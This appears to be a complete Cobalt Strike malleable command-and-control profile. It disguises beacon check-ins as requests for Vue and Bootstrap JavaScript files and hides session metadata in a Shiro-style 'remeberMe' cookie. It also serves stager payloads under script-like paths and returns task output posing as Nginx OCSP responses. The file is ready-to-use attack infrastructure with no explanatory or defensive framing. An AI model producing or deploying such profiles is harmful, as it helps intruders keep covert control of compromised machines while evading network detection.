set sample_name "KrisAbao";

set sleeptime "3000";
set jitter    "0";
set maxdns    "255";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0";

http-get {

    set uri "/script/VUE/src/main.js";

    client {
        header "Accept" "*/*";
	header "Accept-Encoding" "gzip, deflate, br";
	header "Accept-Language" "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2";
	header "Cookie" "path=/";
        metadata {
            base64;
	    prepend "remeberMe=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "application/ocsp-response";
        header "content-transfer-encoding" "binary";
        header "Server" "Nginx";
        output {
            base64;
            print;
        }
    }
}

http-stager {  
    set uri_x86 "/vue.main.js";
    set uri_x64 "/bootstrap-2.min.js";
}
http-config {
    set trust_x_forwarded_for "true";
}
http-post {
    set uri "/api/postit";
    client {
        header "Accept" "*/*";
        id {
            base64;
            prepend "JSESSION=";
            header "Cookie";
        }
        output {
            base64;
            print;
        }
    }

    server {
        header "Content-Type" "application/ocsp-response";
        header "content-transfer-encoding" "binary";
        header "Connection" "keep-alive";
        output {
            base64;
            print;
        }
    }
}

